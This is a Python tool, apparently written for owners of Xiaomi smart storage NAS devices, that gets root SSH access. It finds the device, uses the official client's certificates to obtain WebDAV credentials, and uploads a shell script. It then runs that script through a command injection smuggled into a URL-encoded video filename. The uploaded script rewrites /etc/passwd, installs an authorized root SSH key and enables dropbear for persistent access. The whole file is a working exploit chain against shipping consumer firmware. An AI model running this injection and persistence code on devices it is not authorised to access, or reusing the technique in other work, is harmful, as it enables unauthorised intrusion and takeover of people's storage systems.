#!/usr/bin/env python3
"""
小米智能存储一键开启 SSH，获取 root。
pyinstaller --onefile --console minas_enable_ssh.py
"""

import os
import sys
import tempfile
import time
import ssl
import socket
from pathlib import Path
import warnings

import dns.resolver
import dns.reversename
import requests
from requests.adapters import HTTPAdapter
from cryptography import x509
from cryptography.hazmat.primitives import serialization
from cryptography.hazmat.primitives.asymmetric.ed25519 import Ed25519PrivateKey
from cryptography.hazmat.backends import default_backend
import paramiko
import urllib3

# ---------- 全局变量 ----------
NAS_IP = None
CN = None
CERT_HOME = None
CA_FILE = None
CERT_FILE = None
KEY_FILE = None
UNAME = None
UPWD = None
PUB_KEY_OPENSSH = None

# ---------- 证书和密钥工具 ----------
warnings.filterwarnings('ignore', category=urllib3.exceptions.SubjectAltNameWarning)


def get_nas_certificate(ip, port=443):
    """连接到指定IP的443端口，获取服务器证书并解析CN"""
    try:
        context = ssl.create_default_context()
        # 不验证证书，仅获取
        context.check_hostname = False
        context.verify_mode = ssl.CERT_NONE
        with socket.create_connection((ip, port), timeout=3) as sock:
            with context.wrap_socket(sock, server_hostname="x") as ssock:
                der_cert = ssock.getpeercert(binary_form=True)
                cert = x509.load_der_x509_certificate(
                    der_cert, default_backend())
                subject = cert.subject
                for attr in subject:
                    if attr.oid._name == 'commonName':
                        return attr.value
    except Exception:
        return None


def read_nas_ip():
    """手动输入小米智能存储 IP，并验证是否有效（对应原 Bash read_nas_ip）"""
    while True:
        nas_ip = input("请输入小米智能存储的内网 IP 地址: ").strip()
        if not nas_ip:
            print("IP 地址不能为空，请重新输入。")
            continue
        elif not is_minas_device(nas_ip):
            print("IP 可能错误或指向非小米智能存储，请检查设备状态。")
        else:
            return nas_ip


def is_minas_device(ip):
    try:
        addr = dns.reversename.from_address(ip)
        resolver = dns.resolver.Resolver()
        answers = resolver.resolve(addr, "PTR")
        hostname = str(answers[0])
    except:
        return False

    if "minas" in hostname.lower():
        return True
    return False


def get_nas_ip():
    print("尝试自动获取小米智能存储的内网 IP...")
    try:
        if sys.platform != "win32":
            raise Exception('netbios name only apply for windows')
        return socket.gethostbyname('SmartStorage')
    except:
        pass
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(('114.114.114.114', 53))
        prefix = '.'.join(s.getsockname()[0].split('.')[:3])
        s.close()
    except:
        print("无法自动获取小米智能存储 IP，请检查设备状态并手动输入")
        return read_nas_ip()

    for i in range(1, 255):
        ip = f"{prefix}.{i}"
        if is_minas_device(ip):
            print(f"已发现小米智能存储 IP: {ip}")
            return ip
    print("无法自动获取小米智能存储 IP，请检查设备状态并手动输入")
    return read_nas_ip()

# ---------- 2. 获取证书 CN ----------


def get_cert_cn(ip):
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    with socket.create_connection((ip, 443), timeout=2) as sock:
        with ctx.wrap_socket(sock, server_hostname="x") as ss:
            cert = x509.load_der_x509_certificate(
                ss.getpeercert(binary_form=True))
            return next((a.value for a in cert.subject if a.oid._name == 'commonName'), None)


def get_cert_cn_from_ip():
    print("正在从设备 IP 获取证书 CN...")
    cn = get_nas_certificate(NAS_IP)
    if cn:
        print(f"CN: {cn}")
        return cn
    else:
        print("无法获取证书CN，请检查设备状态。")
        sys.exit(1)

# ---------- 证书文件定位 ----------


def check_cert_files(cert_home, ca_file, cert_file, key_file):
    """检查证书文件是否存在，若缺失则打印错误并返回False"""
    missing = []
    if not ca_file or not os.path.isfile(ca_file):
        missing.append("ca_chain.pem")
    if not cert_file or not os.path.isfile(cert_file):
        missing.append("*_cert.pem")
    if not key_file or not os.path.isfile(key_file):
        missing.append("*_private_key.pem")

    if missing:
        print("证书文件缺失：", file=sys.stderr)
        for m in missing:
            print(f"  - {m}", file=sys.stderr)
        print(f"检测路径: {cert_home}", file=sys.stderr)
        return False
    return True


def prep_certfiles():
    """准备证书文件（Windows 原生，兼容 Linux/macOS）"""
    err_cnt = 0
    while True:
        # 根据操作系统决定默认证书目录
        if sys.platform == "win32" and err_cnt < 3:
            localappdata = os.environ.get('LOCALAPPDATA')
            cert_home = Path(localappdata) / "minasCert"
            not_found_tips = "无法找到证书文件，请确保已登录小米智能存储客户端..."
        else:
            # Linux/macOS 下使用 /tmp/minascert
            cert_home = Path(tempfile.gettempdir()) / "minascert"
            cert_home.mkdir(exist_ok=True)
            not_found_tips = f"无法自动找到证书文件，请手动复制至 {cert_home} 后再按 继续..."

        # 尝试查找证书文件
        ca_file = cert_home / "ca_chain.pem"
        cert_files = list(cert_home.glob("*_cert.pem"))
        key_files = list(cert_home.glob("*_private_key.pem"))
        cert_file = cert_files[0] if cert_files else None
        key_file = key_files[0] if key_files else None

        # 检查证书完整性
        if check_cert_files(cert_home, ca_file, cert_file, key_file):
            print(f"证书文件已就绪，目录：{cert_home}")
            return cert_home, ca_file, cert_file, key_file
        print(not_found_tips)
        input("请确认证书文件已就绪后再按回车键继续：")
        err_cnt += 1

# ---------- HTTP 请求（替代 curl） ----------


class SNIAdapter(HTTPAdapter):
    """自定义适配器，用于设置SNI和客户端证书"""

    def __init__(self, ssl_context, server_hostname):
        self.ssl_context = ssl_context
        self.server_hostname = server_hostname
        super().__init__()

    def init_poolmanager(self, *args, **kwargs):
        kwargs['ssl_context'] = self.ssl_context
        kwargs['server_hostname'] = self.server_hostname
        return super().init_poolmanager(*args, **kwargs)

    def proxy_manager_for(self, *args, **kwargs):
        kwargs['ssl_context'] = self.ssl_context
        kwargs['server_hostname'] = self.server_hostname
        return super().proxy_manager_for(*args, **kwargs)


def create_session():
    """创建带有客户端证书和SNI的requests Session"""
    # 加载客户端证书和私钥
    with open(CERT_FILE, 'rb') as f:
        cert_data = f.read()
    with open(KEY_FILE, 'rb') as f:
        key_data = f.read()
    # 创建SSL上下文
    context = ssl.create_default_context(
        cafile=str(CERT_HOME / "ca_chain.pem"))
    context.load_cert_chain(certfile=CERT_FILE, keyfile=KEY_FILE)
    context.check_hostname = False

    session = requests.Session()
    adapter = SNIAdapter(context, CN)
    session.mount('https://', adapter)
    session.headers.update({'Host': CN})
    return session


def get_webdav_creds():
    """获取WebDAV凭证"""
    print("获取 WebDAV 凭证...")
    session = create_session()
    url = f"https://{NAS_IP}/cgi-bin/luci/filemgr/get_pool_info"
    try:
        resp = session.post(url, json={}, timeout=10)
        resp.raise_for_status()
        data = resp.json()
        uname = data['data']['webDAV']['username']
        upwd = data['data']['webDAV']['password']
        if uname and upwd:
            print(f"WebDAV 凭证解析成功: {uname}")
            return uname, upwd
        else:
            raise ValueError("响应中缺少username/password")
    except Exception as e:
        print(f"获取WebDAV凭证失败: {e}")
        sys.exit(1)

# ---------- SSH 密钥生成（使用 cryptography） ----------


def generate_ssh_key():
    """生成 Ed25519 密钥对，保存为 OpenSSH 格式"""
    print("生成 SSH 密钥对 (ed25519)...")
    ssh_dir = Path.home() / ".ssh"
    ssh_dir.mkdir(exist_ok=True)
    key_path = ssh_dir / "id_ed25519"
    pub_path = ssh_dir / "id_ed25519.pub"

    if key_path.exists() and pub_path.exists():
        print("密钥文件已存在，直接使用原有密钥对（有需要重新生成请自行生成）。")
        return pub_path.read_text().strip()

    # 生成新密钥
    private_key = Ed25519PrivateKey.generate()
    # 私钥（OpenSSH 格式，无密码）
    private_pem = private_key.private_bytes(
        encoding=serialization.Encoding.PEM,
        format=serialization.PrivateFormat.OpenSSH,
        encryption_algorithm=serialization.NoEncryption()
    )
    key_path.write_bytes(private_pem)
    # 公钥（OpenSSH 格式）
    public_key = private_key.public_key()
    ssh_pub_key = public_key.public_bytes(
        encoding=serialization.Encoding.OpenSSH,
        format=serialization.PublicFormat.OpenSSH
    ).decode()
    pub_path.write_text(ssh_pub_key)
    return ssh_pub_key

# ---------- 脚本生成与上传 ----------


def create_enable_script():
    """创建 enable-ssh.sh"""
    script = f'''#!/bin/sh
[ ! -f /etc/passwd.bak ] && cp /etc/passwd /etc/passwd.bak
mkdir -p /home/rootx/.ssh
ln -s /firmware/models models
sed -i 's|:/root:|:/home/rootx:|' /etc/passwd
echo "{PUB_KEY_OPENSSH}" > /home/rootx/.ssh/authorized_keys
chmod 600 /home/rootx/.ssh
chmod 600 /home/rootx/.ssh/authorized_keys
echo 'DROPBEAR_EXTRA_ARGS=" -s"' > /etc/default/dropbear
usermod -s /bin/sh root #/usr/sbin/mi-shell
systemctl enable dropbear.socket
systemctl start dropbear.socket
mitee_tool rpmb set ssh_en true
touch /nas/pool0/{UNAME}/data/SUCCESS
chown {UNAME}:{UNAME} /nas/pool0/{UNAME}/data/SUCCESS
rm /nas/pool0/{UNAME}/data/enable-ssh.sh
'''
    script_path = Path(tempfile.gettempdir()) / "enable-ssh.sh"
    script_path.write_text(script, newline='\n')
    return script_path


def upload_script(script_path):
    """通过 WebDAV 上传脚本"""
    print("上传 enable-ssh.sh 脚本...")
    session = create_session()
    session.auth = (UNAME, UPWD)
    url = f"https://{NAS_IP}:5000/pool0/data/enable-ssh.sh"
    with open(script_path, 'rb') as f:
        data = f.read()
    try:
        resp = session.put(url, data=data, timeout=30)
        if resp.status_code == 204:
            print("上传 enable-ssh.sh 脚本成功 (HTTP 204)")
        else:
            print(f"上传脚本失败，状态码: {resp.status_code}")
            sys.exit(1)
    except Exception as e:
        print(f"上传失败: {e}")
        sys.exit(1)


def trigger_execute():
    """触发执行"""
    print("请求执行 enable-ssh.sh 脚本...")
    session = create_session()
    session.auth = (UNAME, UPWD)
    # 构造特殊路径（URL编码）
    path = f'/pool0/video/__X2%22%3Bsh%20%24%28printf%20%27%5C57nas%5C57pool0%5C57{UNAME}%5C57data%5C57enable-ssh.sh%27%29%3B%22__.ts'
    url = f"https://{NAS_IP}:5000{path}"
    try:
        session.get(url, timeout=10)
        time.sleep(2)
    except Exception as e:
        print(f"请求执行脚本失败: {e}")
        sys.exit(1)

# ---------- SSH 测试（使用 paramiko） ----------


def test_ssh():
    """使用 paramiko 测试 SSH 连接"""
    print("测试 SSH 连接...")
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    # 从内存加载私钥
    pkey = paramiko.Ed25519Key.from_private_key_file(
        str(Path.home() / ".ssh/id_ed25519"))
    try:
        client.connect(NAS_IP, username='root', pkey=pkey, timeout=10)
        stdin, stdout, stderr = client.exec_command('id')
        output = stdout.read().decode().strip()
        if 'uid=0(root)' in output:
            print("SSH 连接成功！所有步骤完成！")
            print(f"私钥位于: {Path.home() / '.ssh/id_ed25519'}")
            print(f"登录命令: ssh root@{NAS_IP}")
        else:
            print("SSH 连接成功但命令执行异常。")
        client.close()
    except Exception as e:
        print(f"SSH 连接失败: {e}")
        sys.exit(1)

# ---------- 主流程 ----------


if __name__ == "__main__":
    print("################################################")
    print("#   __  __    ___    _   _      _      ____    #")
    print("#  |  \/  |  |_ _|  | \ | |    / \    / ___|   #")
    print("#  | |\/| |   | |   |  \| |   / _ \   \___ \   #")
    print("#  | |  | |   | |   | |\  |  / ___ \   ___) |  #")
    print("#  |_|  |_|  |___|  |_| \_| /_/   \_\ \____/   #")
    print("#                                              #")
    print("################################################")
    print("小米智能存储一键开启 SSH + root    @Scruel 2026.08")
    print("################################################")
    NAS_IP = get_nas_ip()
    # 如果自动扫描未获得CN，则单独获取
    CN = get_cert_cn_from_ip()
    # 2. 定位证书文件
    CERT_HOME, CA_FILE, CERT_FILE, KEY_FILE = prep_certfiles()
    # 3. 获取 WebDAV 凭证
    UNAME, UPWD = get_webdav_creds()
    # 4. 生成 SSH 密钥
    PUB_KEY_OPENSSH = generate_ssh_key()
    # 5. 创建并上传脚本
    upload_script(create_enable_script())
    # 6. 触发执行
    trigger_execute()
    # 7. 测试 SSH
    test_ssh()
    input("\n\n按回车键退出...")
